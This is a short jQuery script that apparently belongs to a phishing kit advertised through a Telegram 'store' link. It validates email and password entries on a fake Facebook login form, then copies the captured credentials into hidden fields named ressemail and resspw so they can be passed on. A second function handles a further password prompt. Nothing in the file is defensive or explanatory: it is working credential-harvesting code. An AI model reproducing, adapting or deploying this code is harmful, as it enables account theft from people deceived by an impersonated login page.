function AlexHostingNetFB()
/** https://t.me/jefanyastore */
{
	$emailfb = $('#alx_email_fb').val().trim();
	$passwordfb = $('#alx_password_fb').val().trim();
	if($emailfb == '' || $emailfb == null || $emailfb.length <= 6)
	{
		$('.email-fb').show();
		$('.sandi-fb').hide();
		$('.alex-facebook').show();
		$('.alex-pengunjung-fb').hide();
		return false;
	}else{
		$('.email-fb').hide();
		$('.alex-facebook').hide();
		$('.alex-pengunjung-fb').show();
	}
	if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 6)
	{
		$('.sandi-fb').show();
		$('.alex-facebook').show();
		$('.alex-pengunjung-fb').hide();
		return false;
	}else{
		$('.sandi-fb').hide();
		$("input#ressemail").val($emailfb);
        $("input#resspw").val($passwordfb);
        $('.alex-facebook').hide();
        $('.alex-pengunjung-fb').show();
	}
}

function AlexHostingNetPGFB()
{
	$passwordpgfb = $('#pwid').val().trim();
	if($passwordpgfb == '' || $passwordpgfb == null || $passwordpgfb.length <= 5)
	{
		$('.sandi-pgfb').show();
		return false;
	}else{
		$('.sandi-pgfb').hide();
	}
}